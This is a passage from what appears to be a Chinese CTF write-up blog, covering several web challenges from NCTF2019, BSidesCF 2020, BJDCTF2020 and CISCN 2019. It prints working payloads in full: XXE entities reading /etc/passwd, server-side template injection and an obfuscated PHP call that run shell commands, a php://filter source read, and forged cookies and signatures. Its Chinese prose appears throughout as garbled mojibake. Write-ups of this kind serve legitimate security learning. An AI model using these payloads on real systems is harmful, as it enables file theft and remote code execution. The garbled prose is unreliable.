class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure><p>é€šè¿‡GETæ–¹æ³•ä¼ å…¥paramï¼Œé€šè¿‡cookieä¼ å…¥actionå’Œsign</p><p>å†å¾€ä¸‹ä¼šé‡åˆ°ä¸€ä¸ªifï¼Œç„¶åè¿›å…¥wafå‡½æ•°</p><p>çœ‹çœ‹wafå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>å¦‚æœå‚æ•°å¤´æ˜¯<code>gopher</code>æˆ–<code>file</code>å°±ä¼šè¢«é˜²ä½</p><h3 id="sign-payloadæ„é€ "><a href="#sign-payloadæ„é€ " class="headerlink" title="sign payloadæ„é€ "></a>sign payloadæ„é€ </h3><p>æœ€åä¼šæ„é€ ä¸€ä¸ªTaskç±»</p><p>Taskç±»é‡Œé¦–å…ˆä¼šé‡åˆ°ä¸€ä¸ªcheckSignæ–¹æ³•</p><p>ä¼šåˆ¤æ–­<code>getSign(self.action, self.param) == self.sign</code></p><p>è¿™é‡Œçš„æ„æ€å°±æ˜¯æˆ‘ä»¬è¦æ„é€ ä¸€ä¸ªgetSignä½¿å¾—<code>md5(param+action)</code>==<code>md5(param+&#39;scan&#39;(ä¸å¯æ§))</code>ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨/geneSignè·¯ç”±è¿›è¡Œè‡ªä¸»æ„é€ signå‚æ•°</p><p>param=flag.txtreadï¼Œå› ä¸ºTaskç±»é‡Œçš„ifåˆ¤æ–­æ˜¯åŒ…å«ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨åé¢åŠ ä¸€ä¸ªreadç»•è¿‡åˆ¤æ–­</p><p>æœ€åå¯ä»¥å¾—åˆ°signçš„payload</p><blockquote><p>param=flag.txtread</p></blockquote><h3 id="action-payloadæ„é€ "><a href="#action-payloadæ„é€ " class="headerlink" title="action payloadæ„é€ "></a>action payloadæ„é€ </h3><p>æœ€åå°±æ˜¯</p><p>æ„é€ ä¸€ä¸ªactionçš„payloadè¿›è¡Œflag.txtçš„è¯»å–ï¼Œactionåˆéœ€è¦åŒæ—¶è¿›å…¥ä¸¤ä¸ªif</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·æ•´</p><p>param=flag.txt</p><p>action=readscan</p><p>sign=94f5d01e5071cf13ee12db1b5b76c89f(signå°±æ‹¿ä¹‹å‰åœ¨/geneSignè·¯ç”±ä¸Šå¾—åˆ°çš„</p><p>æœ€åå¾—åˆ°flag</p><blockquote><p>flag{4d8642e8-b33b-439d-8219-651342e482b5}</p></blockquote><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><h3 id="XMLå®ä½“æ³¨å…¥"><a href="#XMLå®ä½“æ³¨å…¥" class="headerlink" title="XMLå®ä½“æ³¨å…¥"></a>XMLå®ä½“æ³¨å…¥</h3><p>æŠ“åŒ…åå‘ç°usernameå’Œpasswordéƒ½æ˜¯xmlæ ¼å¼çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€‰æ‹©XMLæ³¨å…¥</p><p>è¯»å–/etc/passwdæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¯»å–flag</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flag</p><blockquote><p>flag{b831032d-7b48-4d76-bb55-01a9a629def6}</p></blockquote><h3 id="ä»€ä¹ˆæ˜¯XML"><a href="#ä»€ä¹ˆæ˜¯XML" class="headerlink" title="ä»€ä¹ˆæ˜¯XML"></a>ä»€ä¹ˆæ˜¯XML</h3><p>é¡ºä¾¿äº†è§£äº†ä¸€ä¸‹XMLå’Œä»€ä¹ˆæ˜¯XXEæ³¨å…¥</p><p>XXEçœ‹å­—</p><blockquote><p>XXEæ¼æ´å…¨ç§°XML External Entity Injectionå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´ï¼ŒXXEæ¼æ´å‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½æ¶æ„å¤–éƒ¨æ–‡ä»¶ï¼Œé€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³ã€‚xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶ã€‚</p></blockquote><p>XMLå¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« <a href="https://www.freebuf.com/vuls/175451.html">æµ…è°ˆXMLå®ä½“æ³¨å…¥æ¼æ´</a></p><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>è¿›å…¥åå¯ä»¥è¾“å…¥é˜Ÿä¼IDå’Œä»·é’±ï¼Œ1ã€2ã€3éƒ½è¯•äº†ä¸€éç„¶åéƒ½å‡ºé”™äº†ï¼ŒçŒœæµ‹Team4è´­ä¹°æˆåŠŸåå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><p>è¯•è¯•team4ï¼Œç„¶åæç¤º<code>Only one char(?) allowed!</code>ï¼Œåªå…è®¸è¾“å…¥ä¸€ä¸ªå­—ç¬¦</p><h3 id="UTF-8ç‰¹æ®Šå­—ç¬¦ä»£æ›¿"><a href="#UTF-8ç‰¹æ®Šå­—ç¬¦ä»£æ›¿" class="headerlink" title="UTF-8ç‰¹æ®Šå­—ç¬¦ä»£æ›¿"></a>UTF-8ç‰¹æ®Šå­—ç¬¦ä»£æ›¿</h3><p>çœ‹äº†çœ‹æºç å‘ç°æç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure><p>äº†è§£äº†ä¸€ä¸‹UTF-8ç¼–ç ï¼Œå‘ç°UTF-8ç¼–ç å…¶å®æœ‰ç‰¹åˆ«å¤šç‰¹åˆ«å¤šçš„å­—ç¬¦</p><p>è¿™é‡Œå¯ä»¥å»<a href="https://www.compart.com/en/unicode/">è¿™ä¸ªç½‘ç«™</a>ï¼Œè¿™ä¸ªç½‘ç«™æ‹¥æœ‰è®¸å¤šUTF-8å­—ç¬¦</p><p>æŸ¥æ‰¾thousandï¼Œæœ€åå‘ç°äº†ä¸€ä¸ªå­—ç¬¦â†ï¼Œè¿™ä¸ªå­—ç¬¦çš„Numeric Valueä¸º5000ï¼Œæ­£å¥½ç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚</p><p>æœ€åå³å¯å¾—åˆ°flag</p><blockquote><p>flag{76457339-63ab-4556-b52e-5a2f6d054406}</p></blockquote><h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><h3 id="SSTIè·å–screat-key"><a href="#SSTIè·å–screat-key" class="headerlink" title="SSTIè·å–screat_key"></a>SSTIè·å–screat_key</h3><p>é¢˜ç›®æ˜¯ä¸€ä¸ªç®€æ˜“è®¡ç®—å™¨ï¼Œæµ‹è¯•<code>1/0</code>å‘ç°å‡ºç°é”™è¯¯ï¼ŒçŒœæµ‹æ˜¯æ¨¡æ¿æ³¨å…¥ï¼Œè¾“å…¥<code>1/0#&#123;&#123;config&#125;&#125;</code>ï¼Œå‘ç°äº†screat_key</p><h3 id="cookieä¼ªé€ "><a href="#cookieä¼ªé€ " class="headerlink" title="cookieä¼ªé€ "></a>cookieä¼ªé€ </h3><p>ç”¨<code>flask-session-cookie-manager</code>è§£å‡ºcookieçš„ç»“æ„ï¼Œä½¿ç”¨ä¸Šé¢è·å–çš„keyè¿›è¡Œcookieä¼ªé€ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#x27;history&#x27;:[&#123;&#x27;code&#x27;:&#x27;__import__[\&quot;os\&quot;].popen(\&quot;cat flag.txt\&quot;).read()&#x27;&#125;]&#125;&quot;</span></span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag</p><blockquote><p>flag{3990ba1e-8331-4dd6-8bae-77ac90a09c81}</p></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™é¢˜å¯¹ç°åœ¨çš„æˆ‘æ¥è¯´æ˜¯ä¸€é“æ¯”è¾ƒæ–°é²œçš„é¢˜ï¼ŒçŸ¥é“äº†è¿˜æœ‰cookieä¼ªé€ çš„è¿™ä¸ªå§¿åŠ¿ï¼Œé‡æ–°äº†è§£äº†ä¸€ä¸‹cookieçš„å«ä¹‰</p><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>è¿›å…¥é¢˜ç›®çœ‹è§ä¸€å¥<code>You&#39;ll be rewarded with a flag if you can make it over some /hurdles.</code></p><h3 id="curlçš„å‘½ä»¤ä½¿ç”¨"><a href="#curlçš„å‘½ä»¤ä½¿ç”¨" class="headerlink" title="curlçš„å‘½ä»¤ä½¿ç”¨"></a>curlçš„å‘½ä»¤ä½¿ç”¨</h3><p>é€šè¿‡curlæŸ¥çœ‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting the PUT Method.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, Your path would be more exciting if it ended in !</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, Your URL did not ask to </code>get<code>the</code>flag<code> in its query string.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;1&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°</p><p><code>I&#39;m sorry, I expected &#39;&amp;=&amp;=&amp;&#39; to equal &#39;%00 #è¿™æœ‰ä¸ªæ¢è¡Œç¬¦çš„ &#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, Basically, I was expecting the username player.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:player&#39; # æš‚æ—¶ä¸çŸ¥é“å¯†ç ï¼Œéšä¾¿è¾“ä¸€ä¸ª</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#39;open sesame&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting you to be using a 1337 Browser.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was eXpecting this to be Forwarded-For someone!</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 127.0.0.1&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was eXpecting this to be Forwarded For someone through another proxy!</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 1.1.1.1,127.0.0.1&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting the forwarding client to be 13.37.13.37</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting a Fortune Cookie</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;Fuxku&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># è¿™é‡Œéœ€è¦cookieåŒ…å«2021å¹´çš„RFCç¼–å·ï¼Œå¯ä»¥åˆ°è¿™æŸ¥https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ietf-httpstate-cookie&#x2F;23&#x2F;</span><br><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I expect you to accept only plain text media (MIME) type.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, Ğ¯ Ğ¾Ğ¶Ğ¸Ğ´Ğ°Ğ», Ñ‡Ñ‚Ğ¾ Ğ²Ñ‹ Ğ³Ğ¾Ğ²Ğ¾Ñ€Ğ¸Ñ‚Ğµ Ğ¿Ğ¾-Ñ€ÑƒÑÑĞºĞ¸.</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>I&#39;m sorry, I was expecting you would be refered by https://ctf.bsidessf.net/challenges?</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39; -e &#39;https:&#x2F;&#x2F;ctf.bsidessf.net&#x2F;challenges&#39;</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¾—åˆ°flag</p><blockquote><p>flag{a3dda583-ca36-4b88-935f-cb4bbbeef896}</p></blockquote><h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="SSTI-Twig"><a href="#SSTI-Twig" class="headerlink" title="SSTI(Twig"></a>SSTI(Twig</h3><p>Twigçš„æ¨¡æ¿æ³¨å…¥ï¼Œåˆ¤æ–­å¦‚ä¸‹ï¼š</p>49 å›æ˜¾7777777 => Jinja2 ï¼Œå›æ˜¾49 => Twig<p>payload</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°flag</p><blockquote><p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p></blockquote><h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><h3 id="phpå‡½æ•°æ‹¼æ¥"><a href="#phpå‡½æ•°æ‹¼æ¥" class="headerlink" title="phpå‡½æ•°æ‹¼æ¥"></a>phpå‡½æ•°æ‹¼æ¥</h3><p>æ„é€ payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure><p>base_convert(37907361743,10,36)æ„é€ å‡½æ•°åhex2binï¼Œhex2binå¯ä»¥å°†åå…­è¿›åˆ¶è½¬æ¢ä¸ºASCIIå­—ç¬¦</p><p>å…ˆä½¿ç”¨dechexå‡½æ•°å°†<code>1598506324</code>è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼Œç„¶åå†ä½¿ç”¨hex2binå°†åå…­è¿›åˆ¶è½¬æ¢æˆASCIIå­—ç¬¦å³å¯å¾—åˆ°_GET</p><h3 id="phpç‰¹æ€§åˆ©ç”¨"><a href="#phpç‰¹æ€§åˆ©ç”¨" class="headerlink" title="phpç‰¹æ€§åˆ©ç”¨"></a>phpç‰¹æ€§åˆ©ç”¨</h3><p>phpä¸­å¯ä»¥ä½¿ç”¨{}ä»£æ›¿[]ï¼Œç„¶åå†æ‹¼æ¥ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$$pi</span>&#123;pi&#125; =&gt; <span class="variable">$_GET</span>&#123;pi&#125;</span><br><span class="line">(<span class="variable">$$pi</span>&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>&#123;abs&#125;)</span><br></pre></td></tr></table></figure><p>æœ€åä¼ å…¥<code>pi=systemï¼Œabs=cat /flag</code>å³å¯å¾—åˆ°flag</p><blockquote><p>flag{693ee03e-518a-46bb-9102-79ac9f502b31}</p></blockquote><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h3 id="phpä¼ªåè®®åµŒå¥—"><a href="#phpä¼ªåè®®åµŒå¥—" class="headerlink" title="phpä¼ªåè®®åµŒå¥—"></a>phpä¼ªåè®®åµŒå¥—</h3><p>åˆ©ç”¨phpä¼ªåè®®å¯ä»¥è¯»å–åˆ°indexçš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span 